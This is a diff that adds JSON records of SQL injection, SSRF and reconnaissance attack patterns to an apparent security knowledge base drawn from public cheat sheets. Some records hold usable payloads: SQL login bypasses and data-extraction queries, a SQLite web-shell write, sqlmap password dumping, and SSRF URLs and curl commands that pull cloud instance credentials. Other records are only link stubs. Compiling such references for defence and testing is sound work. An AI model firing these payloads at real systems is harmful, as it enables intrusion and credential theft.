+  },
+  {
+    "id": "recon-27",
+    "type": "ExploitPattern",
+    "category": "RECON",
+    "title": "Hash Cracking",
+    "description": ":warning: Content of this page has been moved to [InternalAllTheThings/cheatsheets/hash-cracking](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/hash-cracking/) - [Hashcat](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/hash-cracking/#hashcat) - [Hashcat Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) - [Hashcat Install](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/hash-cracking/#hashcat-install) - [Mask attack](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/hash-cracking/#mask-attack)",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "recon"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "recon-28",
+    "type": "ExploitPattern",
+    "category": "RECON",
+    "title": "Initial Access",
+    "description": ":warning: Content of this page has been moved to [InternalAllTheThings/redteam/access/initial-access](https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/initial-access/) - [Complex Chains](https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/initial-access/#complex-chains) - [Container](https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/initial-access/#container) - [Payload](https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/initial-access/#payload)",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "recon"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "recon-32",
+    "type": "ExploitPattern",
+    "category": "RECON",
+    "title": "MSSQL Server",
+    "description": ":warning: Content of this page has been moved to [InternalAllTheThings/cheatsheets/mssql-server-cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/mssql-server-cheatsheet/) - [Tools](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/mssql-server-cheatsheet/#tools) - [Identify Instances and Databases](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/mssql-server-cheatsheet/#identifiy-instaces-and-databases) - [Discover Local SQL Server Instances](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/mssql-server-cheatsheet/#discover-local-sql-server-instances)",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "recon"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "recon-33",
+    "type": "ExploitPattern",
+    "category": "RECON",
+    "title": "Metasploit",
+    "description": ":warning: Content of this page has been moved to [InternalAllTheThings/command-control/metasploit](https://swisskyrepo.github.io/InternalAllTheThings/command-control/metasploit/) - [Installation](https://swisskyrepo.github.io/InternalAllTheThings/command-control/metasploit/#installation) - [Sessions](https://swisskyrepo.github.io/InternalAllTheThings/command-control/metasploit/#sessions) - [Background handler](https://swisskyrepo.github.io/InternalAllTheThings/command-control/metasploit/#background-handler)",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "recon"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "recon-34",
+    "type": "ExploitPattern",
+    "category": "RECON",
+    "title": "Bug Hunting Methodology and Enumeration",
+    "description": ":warning: Content of this page has been moved to [InternalAllTheThings/methodology/bug-hunting-methodology](https://swisskyrepo.github.io/InternalAllTheThings/methodology/bug-hunting-methodology/) - [Passive Recon](https://swisskyrepo.github.io/InternalAllTheThings/methodology/bug-hunting-methodology/#passive-recon) - [Active Recon](https://swisskyrepo.github.io/InternalAllTheThings/methodology/bug-hunting-methodology/#active-recon) - [Network discovery](https://swisskyrepo.github.io/InternalAllTheThings/methodology/bug-hunting-methodology/#network-discovery)",
+    "techniques": [
+      "Wayback Machine",
+      "The Harvester",
+      "Github OSINT"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "recon"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "recon-35",
+    "type": "ExploitPattern",
+    "category": "RECON",
+    "title": "Network Discovery",
+    "description": ":warning: Content of this page has been moved to [InternalAllTheThings/cheatsheets/network-discovery](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/network-discovery/) - [Nmap](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/network-discovery/#nmap) - [Network Scan with nc and ping](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/network-discovery/#network-scan-with-nc-and-ping) - [Spyse](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/network-discovery/#spyse)",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "recon"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "recon-37",
+    "type": "ExploitPattern",
+    "category": "RECON",
+    "title": "Office - Attacks",
+    "description": ":warning: Content of this page has been moved to [InternalAllTheThings/redteam/access/office-attacks](https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/office-attacks/) - [Office Products Features](https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/office-attacks/#office-products-features) - [Office Default Passwords](https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/office-attacks/#office-default-passwords) - [Office Macro execute WinAPI](https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/office-attacks/#office-macro-execute-winapi)",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "recon"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "recon-39",
+    "type": "ExploitPattern",
+    "category": "RECON",
+    "title": "Reverse Shell Cheat Sheet",
+    "description": ":warning: Content of this page has been moved to [InternalAllTheThings/cheatsheet/shell-reverse](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) - [Tools](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#tools) - [Reverse Shell](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#reverse-shell) - [Awk](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#awk)",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "recon"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "recon-40",
+    "type": "ExploitPattern",
+    "category": "RECON",
+    "title": "Source Code Management & CI/CD Compromise",
+    "description": ":warning: Content of this page has been moved to [InternalAllTheThings/cheatsheets/source-code-management-ci](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/source-code-management-ci/) - [CI/CD Attacks](https://swisskyrepo.github.io/InternalAllTheThings/devops/) - [Azure DevOps](https://swisskyrepo.github.io/InternalAllTheThings/devops/cicd-azure-devops/) - [BuildKite](https://swisskyrepo.github.io/InternalAllTheThings/devops/cicd-buildkite/) - [CircleCI](https://swisskyrepo.github.io/InternalAllTheThings/devops/cicd-circle-ci/)",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "recon"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "recon-41",
+    "type": "ExploitPattern",
+    "category": "RECON",
+    "title": "Vulnerability Reports",
+    "description": ":warning: Content of this page has been moved to [InternalAllTheThings/methodology/vulnerability-reports](https://swisskyrepo.github.io/InternalAllTheThings/methodology/vulnerability-reports/) - [Tools](https://swisskyrepo.github.io/InternalAllTheThings/methodology/vulnerability-reports/#tools) - [Vulnerability Report Structure](https://swisskyrepo.github.io/InternalAllTheThings/methodology/vulnerability-reports/#vulnerability-report-structure) - [Vulnerability Details Structure](https://swisskyrepo.github.io/InternalAllTheThings/methodology/vulnerability-reports/#vulnerability-details-structure)",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "recon"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "recon-42",
+    "type": "ExploitPattern",
+    "category": "RECON",
+    "title": "Subdomains Enumeration",
+    "description": ":warning: Content of this page has been moved to [InternalAllTheThings/redteam/access/web-attack-surface](https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/redteam/access/web-attack-surface.md) - [Enumerate Subdomains](https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/web-attack-surface/#enumerate-subdomains) - [Subdomains Databases](https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/web-attack-surface/#subdomains-databases) - [Bruteforce Subdomains](https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/web-attack-surface/#bruteforce-subdomains)",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "recon"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "sqli-51",
+    "type": "ExploitPattern",
+    "category": "SQLI",
+    "title": "Google BigQuery SQL Injection",
+    "description": "> Google BigQuery SQL Injection  is a type of security vulnerability where an attacker can execute arbitrary SQL queries on a Google BigQuery database by manipulating user inputs that are incorporated into SQL queries without proper sanitization. This can lead to unauthorized data access, data manipulation, or other malicious activities. * [BigQuery Comment](#bigquery-comment) * [BigQuery Union Based](#bigquery-union-based) * [BigQuery Error Based](#bigquery-error-based) * [BigQuery Boolean Based](#bigquery-boolean-based)",
+    "techniques": [
+      "Use a classic single quote to trigger an error: `'`",
+      "Identify BigQuery using backtick notation: ```SELECT .... FROM `` AS ...```",
+      "Time based functions does not exist in the BigQuery syntax.",
+      "| SQL Query                                             | Description |",
+      "| ----------------------------------------------------- | -------------------- |",
+      "| `SELECT @@project_id`                                 | Gathering project id |",
+      "| `SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA` | Gathering all dataset names |",
+      "| `select * from project_id.dataset_name.table_name`    | Gathering data from specific project id & dataset |",
+      "| Type                       | Description                       |",
+      "|----------------------------|-----------------------------------|",
+      "| `#`                        | Hash comment                      |",
+      "| `/* PostgreSQL Comment */` | C-style comment                   |",
+      "| SQL Query                                                | Description          |",
+      "| -------------------------------------------------------- | -------------------- |",
+      "| `' OR if(1/(length((select('a')))-1)=1,true,false) OR '` | Division by zero     |",
+      "| `select CAST(@@project_id AS INT64)`                     | Casting              |"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "sqli"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "sqli-52",
+    "type": "ExploitPattern",
+    "category": "SQLI",
+    "title": "Cassandra Injection",
+    "description": "> Apache Cassandra is a free and open-source distributed wide column store NoSQL database management system. * [CQL Injection Limitations](#cql-injection-limitations) * [Cassandra Comment](#cassandra-comment) * [Cassandra Login Bypass](#cassandra-login-bypass) * Cassandra is a non-relational database, so CQL doesn't support `JOIN` or `UNION` statements, which makes cross-table queries more challenging. * Additionally, Cassandra lacks convenient built-in functions like `DATABASE()` or `USER()` for retrieving database metadata.",
+    "techniques": [
+      "Cassandra is a non-relational database, so CQL doesn't support `JOIN` or `UNION` statements, which makes cross-table queries more challenging.",
+      "Additionally, Cassandra lacks convenient built-in functions like `DATABASE()` or `USER()` for retrieving database metadata.",
+      "Another limitation is the absence of the `OR` operator in CQL, which prevents creating always-true conditions; for instance, a query like `SELECT * FROM table WHERE col1='a' OR col2='b';` will be rejected.",
+      "Time-based SQL injections, which typically rely on functions like `SLEEP()` to introduce a delay, are also difficult to execute in CQL since it doesn’t include a `SLEEP()` function.",
+      "CQL does not allow subqueries or other nested statements, so a query like `SELECT * FROM table WHERE column=(SELECT column FROM table LIMIT 1);` would be rejected.",
+      "/* Cassandra Comment */",
+      "username: admin' ALLOW FILTERING; %00",
+      "password: ANY",
+      "username: admin'/*",
+      "password: */and pass>'",
+      "SELECT * FROM users WHERE user = 'admin'/*' AND pass = '*/and pass>'' ALLOW FILTERING;"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "sqli"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "sqli-53",
+    "type": "ExploitPattern",
+    "category": "SQLI",
+    "title": "DB2 Injection",
+    "description": "> IBM DB2 is a family of relational database management systems (RDBMS) developed by IBM. Originally created in the 1980s for mainframes, DB2 has evolved to support various platforms and workloads, including distributed systems, cloud environments, and hybrid deployments. * [DB2 Comments](#db2-comments) * [DB2 Default Databases](#db2-default-databases) * [DB2 Enumeration](#db2-enumeration) * [DB2 Methodology](#db2-methodology) * [DB2 Error Based](#db2-error-based) * [DB2 Blind Based](#db2-blind-based)",
+    "techniques": [
+      "-- Returns all in one xml-formatted string",
+      "select xmlagg(xmlrow(table_schema)) from sysibm.tables",
+      "-- Same but without repeated elements",
+      "select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables)",
+      "-- Returns all in one xml-formatted string.",
+      "-- May need CAST(xml2clob(… AS varchar(500)) to display the result.",
+      "select xml2clob(xmelement(name t, table_schema)) from sysibm.tables",
+      "' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68",
+      "'||QCMDEXC('QSH CMD(''system dspusrprf PROFILE'')')",
+      "SELECT chr(65)||chr(68)||chr(82)||chr(73) FROM sysibm.sysdummy1"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "sqli"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "sqli-54",
+    "type": "ExploitPattern",
+    "category": "SQLI",
+    "title": "MSSQL Injection",
+    "description": "> MSSQL Injection  is a type of security vulnerability that can occur when an attacker can insert or \"inject\" malicious SQL code into a query executed by a Microsoft SQL Server (MSSQL) database. This typically happens when user inputs are directly included in SQL queries without proper sanitization or parameterization. SQL Injection can lead to serious consequences such as unauthorized data access, data manipulation, and even gaining control over the database server. * [MSSQL Default Databases](#mssql-default-databases)",
+    "techniques": [
+      "Extract databases names",
+      "Extract tables from Injection database",
+      "Extract columns for the table Users",
+      "Finally extract the data",
+      "For integer inputs",
+      "For string inputs",
+      "Stacked query without any statement terminator",
+      "Use a semi-colon \"`;`\" to add another query",
+      "Permission: Requires `VIEW SERVER STATE` permission on the server.",
+      "Permission: Requires the `CONTROL SERVER` permission.",
+      "Find links using `sysservers`: contains one row for each server that an instance of SQL Server can access as an OLE DB data source.",
+      "Execute query through the link",
+      "Execute shell commands",
+      "Listing effective permissions of current user on the server.",
+      "Listing effective permissions of current user on the database.",
+      "Listing effective permissions of current user on a view.",
+      "Check if current user is a member of the specified server role.",
+      "MSSQL 2000: Hashcat mode 131: `0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578`",
+      "MSSQL 2005: Hashcat mode 132: `0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe`",
+      "SELECT name FROM master..sysdatabases;"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "sqli"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "sqli-55",
+    "type": "ExploitPattern",
+    "category": "SQLI",
+    "title": "MySQL Injection",
+    "description": "> MySQL Injection  is a type of security vulnerability that occurs when an attacker is able to manipulate the SQL queries made to a MySQL database by injecting malicious input. This vulnerability is often the result of improperly handling user input, allowing attackers to execute arbitrary SQL code that can compromise the database's integrity and security. * [MYSQL Default Databases](#mysql-default-databases) * [MYSQL Comments](#mysql-comments) * [MYSQL Testing Injection](#mysql-testing-injection)",
+    "techniques": [
+      "Strings: Query like `SELECT * FROM Table WHERE id = 'FUZZ';`",
+      "Numeric: Query like `SELECT * FROM Table WHERE id = FUZZ;`",
+      "Login: Query like `SELECT * FROM Users WHERE username = 'FUZZ1' AND password = 'FUZZ2';`",
+      "TRUE: `if @@version starts with a 5`:",
+      "FALSE: `if @@version starts with a 4`:",
+      "SecurityIdiots",
+      "ID : The process identifier.",
+      "USER : The MySQL user who is running the process.",
+      "HOST : The host from which the process was initiated.",
+      "DB : The database the process is currently accessing, if any.",
+      "COMMAND : The type of command the process is executing (e.g., Query, Sleep).",
+      "TIME : The time in seconds that the process has been running.",
+      "STATE : The current state of the process.",
+      "INFO : The text of the statement being executed, or NULL if no statement is being executed.",
+      "`group_concat()` = 1024 symbols",
+      "`json_arrayagg()` > 16,000,000 symbols",
+      "`1e3` represents `1 x 10^3` which is `1000`.",
+      "`1.5e3` represents `1.5 x 10^3` which is `1500`.",
+      "`2e-3` represents `2 x 10^-3` which is `0.002`.",
+      "`SELECT table_name FROM information_schema 1.e.tables`"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "sqli"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "sqli-56",
+    "type": "ExploitPattern",
+    "category": "SQLI",
+    "title": "Oracle SQL Injection",
+    "description": "> Oracle SQL Injection  is a type of security vulnerability that arises when attackers can insert or \"inject\" malicious SQL code into SQL queries executed by Oracle Database. This can occur when user inputs are not properly sanitized or parameterized, allowing attackers to manipulate the query logic. This can lead to unauthorized access, data manipulation, and other severe security implications. * [Oracle SQL Default Databases](#oracle-sql-default-databases) * [Oracle SQL Comments](#oracle-sql-comments)",
+    "techniques": [
+      "List Java privileges",
+      "Grant privileges",
+      "Execute commands",
+      "10g R2, 11g R1 and R2: `DBMS_JAVA_TEST.FUNCALL()`",
+      "11g R1 and R2: `DBMS_JAVA.RUNJAVA()`",
+      "Create Java class",
+      "Run OS command",
+      "| Description           | Query          |",
+      "| :-------------------- | :------------- |",
+      "| Invalid HTTP Request  | `SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual` |",
+      "| CTXSYS.DRITHSX.SN     | `SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual` |",
+      "| Invalid XPath         | `SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual` |",
+      "| Invalid XML           | `SELECT to_char(dbms_xmlgen.getxml('select \"'&#124;&#124;(select user from sys.dual)&#124;&#124;'\" FROM sys.dual')) FROM dual` |",
+      "| Invalid XML           | `SELECT rtrim(extract(xmlagg(xmlelement(\"s\", username &#124;&#124; ',')),'/s').getstringval(),',') FROM all_users` |",
+      "| SQL Error             | `SELECT NVL(CAST(LENGTH(USERNAME) AS VARCHAR(4000)),CHR(32)) FROM (SELECT USERNAME,ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1))` |",
+      "| XDBURITYPE getblob    | `XDBURITYPE((SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')).getblob()` |",
+      "| XDBURITYPE getclob    | `XDBURITYPE((SELECT table_name FROM (SELECT ROWNUM r,table_name FROM all_tables ORDER BY table_name) WHERE r=1)).getclob()` |",
+      "| XMLType               | `AND 1337=(SELECT UPPER(XMLType(CHR(60)\\|\\|CHR(58)\\|\\|'~'\\|\\|(REPLACE(REPLACE(REPLACE(REPLACE((SELECT banner FROM v$version),' ','_'),'$','(DOLLAR)'),'@','(AT)'),'#','(HASH)'))\\|\\|'~'\\|\\|CHR(62))) FROM DUAL) -- -` |",
+      "| DBMS_UTILITY          | `AND 1337=DBMS_UTILITY.SQLID_TO_SQLHASH('~'\\|\\|(SELECT banner FROM v$version)\\|\\|'~') -- -` |",
+      "When the injection point is inside a string use : `'||PAYLOAD--`"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "sqli"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "sqli-57",
+    "type": "ExploitPattern",
+    "category": "SQLI",
+    "title": "PostgreSQL Injection",
+    "description": "> PostgreSQL SQL injection refers to a type of security vulnerability where attackers exploit improperly sanitized user input to execute unauthorized SQL commands within a PostgreSQL database. * [PostgreSQL Comments](#postgresql-comments) * [PostgreSQL Enumeration](#postgresql-enumeration) * [PostgreSQL Methodology](#postgresql-methodology) * [PostgreSQL Error Based](#postgresql-error-based) * [PostgreSQL XML Helpers](#postgresql-xml-helpers) * [PostgreSQL Blind](#postgresql-blind) * [PostgreSQL Blind With Substring Equivalent](#postgresql-blind-with-substring-equivalent)",
+    "techniques": [
+      "Using `pg_read_file`, `pg_ls_dir`",
+      "Using `COPY`",
+      "Using `lo_import`",
+      "Using `COPY` (one-line)",
+      "Using `lo_from_bytea`, `lo_put` and `lo_export`",
+      "CAST(chr(126)||VERSION()||chr(126) AS NUMERIC)",
+      "CAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)--",
+      "CAST(chr(126)||(SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset)||chr(126) AS NUMERIC)--",
+      "CAST(chr(126)||(SELECT data_column FROM data_table LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)",
+      "' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1",
+      "' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1",
+      "' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1",
+      "' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1",
+      "SELECT query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row",
+      "SELECT database_to_xml(true,true,''); -- dump the current database to XML",
+      "SELECT database_to_xmlschema(true,true,''); -- dump the current db to an XML schema",
+      "' and substr(version(),1,10) = 'PostgreSQL' and '1  -- TRUE",
+      "' and substr(version(),1,10) = 'PostgreXXX' and '1  -- FALSE",
+      "select 1 from pg_sleep(5)",
+      ";(select 1 from pg_sleep(5))"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "sqli"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "sqli-58",
+    "type": "ExploitPattern",
+    "category": "SQLI",
+    "title": "SQLite Injection",
+    "description": "> SQLite Injection  is a type of security vulnerability that occurs when an attacker can insert or \"inject\" malicious SQL code into SQL queries executed by an SQLite database. This vulnerability arises when user inputs are integrated into SQL statements without proper sanitization or parameterization, allowing attackers to manipulate the query logic. Such injections can lead to unauthorized data access, data manipulation, and other severe security issues. * [SQLite Comments](#sqlite-comments) * [SQLite Enumeration](#sqlite-enumeration)",
+    "techniques": [
+      "AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END",
+      "AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))",
+      "AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
+      "ATTACH DATABASE '/var/www/shell.php' AS shell;",
+      "CREATE TABLE shell.pwn (dataz text);",
+      "INSERT INTO shell.pwn (dataz) VALUES ('');--",
+      "This writes a new cron entry that runs every minute and connects back to the attacker.",
+      ":warning: SQLite's ability to load external shared libraries (extensions) is disabled by default in most environments. When enabled, SQLite can load a compiled module using the `load_extension()` SQL function:",
+      "In the sqlite3 command-line shell you can display runtime configuration with:",
+      "If you see `load_extension on` (or off), that indicates whether the shell's runtime currently permits loading shared-library extensions.",
+      "To compile a loadable extension on Linux, you can use:",
+      "SQLite does not support file I/O operations by default."
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "sqli"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "sqli-59",
+    "type": "ExploitPattern",
+    "category": "SQLI",
+    "title": "SQLmap",
+    "description": "> SQLmap is a powerful tool that automates the detection and exploitation of SQL injection vulnerabilities, saving time and effort compared to manual testing. It supports a wide range of databases and injection techniques, making it versatile and effective in various scenarios. > Additionally, SQLmap can retrieve data, manipulate databases, and even execute commands, providing a robust set of features for penetration testers and security analysts. > Reinventing the wheel isn't ideal because SQLmap has been rigorously developed, tested, and improved by experts. Using a reliable, community-supported tool means you benefit from established best practices and avoid the high risk of missing vulnerabilities or introducing errors in custom code.",
+    "techniques": [
+      "Meterpreter:",
+      "`--batch` = Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers",
+      "`--crawl` = How deep you want to crawl a site",
+      "`--forms` = Parse and test forms",
+      "HTTP Proxy:",
+      "SOCKS Proxy:",
+      "SOCKS5 Proxy:",
+      "`--suffix=SUFFIX`: The `--suffix` option appends a specified string to the end of each payload generated by SQLMap.",
+      "`--prefix=PREFIX`: The `--prefix` option prepends a specified string to the beginning of each payload generated by SQLMap.",
+      "`__priority__`: Defines the order in which tamper scripts are applied.  This sets how early or late SQLmap should apply your tamper script in the tamper pipeline. Normal priority is 0 and the highest is 100.",
+      "`dependencies()`: This function gets called before the tamper script is used.",
+      "`tamper(payload)`: The main function that modifies the payload.",
+      "Save it as something like: `mytamper.py`",
+      "Place it inside SQLmap's `tamper/` directory, typically:",
+      "Use it with SQLmap",
+      "Dynamic parameters: When a parameter needs to be randomly or sequentially generated.",
+      "Token generation: For handling CSRF tokens or dynamic auth headers.",
+      "Custom logic: E.g., encoding, encryption, timestamps, etc.",
+      "sqlmap --url=\"\" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs",
+      "sqlmap -r request.txt"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "sqli"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "ssrf-60",
+    "type": "ExploitPattern",
+    "category": "SSRF",
+    "title": "SSRF Advanced Exploitation",
+    "description": "> Some services (e.g., Redis, Elasticsearch) allow unauthenticated data writes or command execution when accessed directly. An attacker could exploit SSRF to interact with these services, injecting malicious payloads like web shells or manipulating application state. Query an internal DNS resolver to trigger a full zone transfer (**AXFR**) and exfiltrate a list of subdomains. domain,tld = \"example.lab\".split('.') dns_request =  b\"\\x01\\x03\\x03\\x07\"    # BITMAP dns_request += b\"\\x00\\x01\"            # QCOUNT",
+    "techniques": [
+      "Getting a webshell with `dict://`",
+      "Getting a PHP reverse shell with `gopher://`",
+      "Example of payload for `example.lab`: `gopher://127.0.0.1:25/_%00%1D%01%03%03%07%00%01%00%00%00%00%00%00%07example%03lab%00%00%FC%00%01`",
+      "Requires to know the full path of one PHP file on the server, by default the exploit is using `/usr/share/php/PEAR.php`.",
+      "Memcached communicates over port 11211 by default. While it is primarily used for storing serialized data to enhance application performance, vulnerabilities can arise during the deserialization of this data.",
+      "MySQL user should not be password protected.",
+      "> Redis is a database system that stores everything in RAM",
+      "* Getting a webshell with `dict://`",
+      "* Getting a PHP reverse shell with `gopher://`",
+      "Malicious actors can craft `gopher://` URLs to manipulate low-level protocols (like HTTP or SMTP) on internal systems.",
+      "The following PHP script can be used to generate a page that will redirect to the `gopher://` payload.",
+      "Exploit using the Gopher protocol, full exploit script available at [wofeiwo/webcgi-exploits/uwsgi_exp.py](https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py)."
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "ssrf"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "ssrf-61",
+    "type": "ExploitPattern",
+    "category": "SSRF",
+    "title": "SSRF URL for Cloud Instances",
+    "description": "> When exploiting Server-Side Request Forgery (SSRF) in cloud environments, attackers often target metadata endpoints to retrieve sensitive instance information (e.g., credentials, configurations). Below is a categorized list of common URLs for various cloud and infrastructure providers * [SSRF URL for AWS Bucket](#ssrf-url-for-aws) * [SSRF URL for AWS ECS](#ssrf-url-for-aws-ecs) * [SSRF URL for AWS Elastic Beanstalk](#ssrf-url-for-aws-elastic-beanstalk) * [SSRF URL for AWS Lambda](#ssrf-url-for-aws-lambda)",
+    "techniques": [
+      "IPv4 endpoint (old): `http://169.254.169.254/latest/meta-data/`",
+      "IPv4 endpoint (new) requires the header `X-aws-ec2-metadata-token`",
+      "IPv6 endpoint: `http://[fd00:ec2::254]/latest/meta-data/`",
+      "DNS record pointing to the AWS API IP",
+      "HTTP redirect",
+      "Encoding the IP to bypass WAF",
+      "Jira SSRF leading to AWS info disclosure - `https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance`",
+      "*Flaws challenge - `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/`",
+      "SSH Public Key : `http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json`",
+      "Get Access Token : `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token`",
+      "Kubernetes Key : `http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json`",
+      "Daemon socket option:",
+      "Docker Engine API:",
+      "export TOKEN=`curl -X PUT -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\" \"http://169.254.169.254/latest/api/token\"`",
+      "curl -H \"X-aws-ec2-metadata-token:$TOKEN\" -v \"http://169.254.169.254/latest/meta-data\"",
+      "http://instance-data",
+      "http://169.254.169.254",
+      "http://169.254.169.254.nip.io/",
+      "Static:http://nicob.net/redir6a",
+      "Dynamic:http://nicob.net/redir-http-169.254.169.254:80-"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "ssrf"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-62",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Server Side Template Injection - ASP.NET",
+    "description": "> Server-Side Template Injection (SSTI)  is a class of vulnerabilities where an attacker can inject malicious input into a server-side template, causing the template engine to execute arbitrary code on the server. In the context of ASP.NET, SSTI can occur if user input is directly embedded into a template (such as Razor, ASPX, or other templating engines) without proper sanitization. - [ASP.NET Razor](#aspnet-razor) - [ASP.NET Razor - Basic Injection](#aspnet-razor---basic-injection) - [ASP.NET Razor - Command Execution](#aspnet-razor---command-execution)",
+    "techniques": [
+      "@(1+2)"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-63",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Server Side Template Injection - Elixir",
